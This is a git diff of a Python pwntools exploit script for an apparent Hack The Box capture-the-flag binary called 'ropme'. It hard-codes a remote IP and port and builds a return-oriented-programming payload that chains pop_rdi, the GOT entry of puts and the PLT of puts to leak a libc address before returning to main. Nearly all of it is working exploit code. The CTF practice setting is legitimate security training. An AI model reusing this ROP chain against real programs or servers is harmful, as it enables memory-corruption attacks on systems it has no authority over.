@@ -13,8 +13,8 @@ pty = process.PTY
 program_name = './ropme'
 elf = ELF(program_name)
 dremote_server = 'docker.hackthebox.eu'
-remote_server = '178.62.86.12'
-PORT = '30889'
+remote_server = '68.183.38.65'
+PORT = 32761
 #dPORT = '30090'
 
 parser = argparse.ArgumentParser(description='Exploit the bins.')
@@ -22,10 +22,11 @@ parser.add_argument('--dbg'     , '-d', action="store_true")
 parser.add_argument('--remote'  , '-r', action="store_true")
 args = parser.parse_args()
 
-if args.remote:
-    p = remote(remote_server, PORT)
-else:
-    p = process(program_name, stdin=pty, stdout=pty)
+#if args.remote:
+print('connecting')
+p = remote(remote_server, PORT)
+#else:
+ #   p = process(program_name, stdin=pty, stdout=pty)
 
 if args.dbg:
     gdb.attach(p, '''
@@ -44,14 +45,17 @@ payload = f"{junk}{pop_rdi}{got_put}{plt_put}{plt_main}"
 payload = payload.replace("b", "")
 payload = payload.replace("'b'", "")
 payload = payload.replace("'", "")
+payload = payload.replace("`", "")
+payload = payload.replace("@", "")
 
 p.recvuntil(b"ROP me outside, how 'about dah?")
 p.sendline(bytes(payload, encoding='utf8'))
 #p.clean()
-p.recvline(keepends=False)
+#p.recvline(keepends=False)
 #p.interactive()
 try:
-    leaked_puts = p.recvline().strip().ljust(8, "\x00")
+    #p.interactive("")
+    leaked_puts = p.recvline().strip().ljust(8, b"\x00")
 except EOFError:
     print('error')
 
